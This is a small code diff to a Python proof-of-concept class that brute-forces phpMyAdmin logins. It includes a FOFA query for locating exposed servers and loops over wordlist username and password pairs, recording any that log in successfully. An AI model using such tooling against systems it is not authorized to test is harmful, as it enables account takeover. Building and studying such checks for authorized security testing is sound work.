@@ -29,7 +29,7 @@ class PmaBurstPOC(POCBase):
     fofa.so
     app="phpMyAdmin"
 
-    
+
     '''
     samples = []
     install_requires = ['']
@@ -67,8 +67,8 @@ class PmaBurstPOC(POCBase):
         url = self.url
         # print(url)
         try:
-            for username, password in get_word_list():
-                if pma_login(url, username.strip(), password.strip()):
+            for username, password in self.get_word_list():
+                if self.pma_login(url, username.strip(), password.strip()):
                     result['VerifyInfo'] = {}
                     result['VerifyInfo']['URL'] = self.url
                     result['VerifyInfo']['Username'] = username.strip()
